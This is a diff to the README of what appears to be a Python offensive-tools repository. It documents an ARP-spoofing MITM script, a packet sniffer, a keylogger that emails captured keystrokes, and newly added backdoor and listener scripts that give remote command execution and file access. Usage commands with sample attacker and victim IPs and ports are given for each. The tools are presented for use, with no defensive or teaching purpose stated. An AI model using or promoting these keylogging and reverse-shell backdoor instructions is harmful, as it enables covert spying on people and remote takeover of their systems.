@@ -12,7 +12,9 @@
 - myARP_poison.py (ARP spoofing - MITM attacker)
 - myPacket_listener.py ( Network Packets listener )
 - myKeylogger.py ( Key Logger )
-
+- mySocket.py ( Backdoor )
+- mySocket_listener.py ( Listener for backdoor )
+  
 --------------------------------------------------------------------------------------------------------------------
   
 ### Get Started :
@@ -84,3 +86,28 @@ To use myKeylogger (Key Logger):
 - -$ `python3 myKeylogger.py -e email@gmail.com -p password1` <br>
    -e : specifies email address to send recorded keystrokes <br>
    -p : specifies the password of that email
+
+
+--------------------------------------------------------------------------------------------------------------------
+
+
+# mySocket - Backdoor
+Python script that connects to an IP address on a specific port and lets that system execute commands and take control over the system.<br>
+To use mySocket ( Backdoor ):
+- -$ `python3 mySocket.py -i 192.168.1.20 -p 8080`<br>
+     -i : ip address of the attacker<br>
+     -p : port number
+
+
+  --------------------------------------------------------------------------------------------------------------------
+
+
+  
+# mySocket_listener - Backdoor listener
+Python script that is capable of executing command in a remote connected system, access files and navigate through directories.<br>
+To use mySocket_listener ( Backdoor listener ):
+- -$ `python3 mySocket_listener.py -i 192.168.1.2 -p 8080` <br>
+     -i : ip address of the remote system<br>
+     -p : port number
+
+  
